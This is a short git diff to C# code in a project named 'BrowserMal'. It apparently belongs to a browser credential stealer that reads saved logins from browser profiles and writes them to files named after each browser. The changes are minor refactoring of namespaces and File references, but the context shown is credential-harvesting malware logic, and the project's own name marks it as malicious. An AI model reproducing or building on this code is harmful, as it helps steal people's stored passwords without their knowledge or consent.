@@ -7,6 +7,8 @@ using SqliteReader;
 using BrowserMal.Browser;
 using BrowserMal.AES;
 using BrowserMal.Credential;
+using BrowserMal.Filesaver;
+using System.IO;
 
 namespace BrowserMal
 {
@@ -34,7 +36,7 @@ namespace BrowserMal
                 if (result.Count == 0)
                     continue;
 
-                File.FileManager.Save<CredentialModel>(result, $"{browser.Name}_logins.txt");
+                FileManager.Save<CredentialModel>(result, $"{browser.Name}_logins.txt");
             }
         }
 
@@ -45,7 +47,7 @@ namespace BrowserMal
 
             foreach (string profile in profiles)
             {
-                if (!System.IO.File.Exists(profile))
+                if (!File.Exists(profile))
                     continue;
 
                 creds.AddRange(GetProfileLogins(profile));
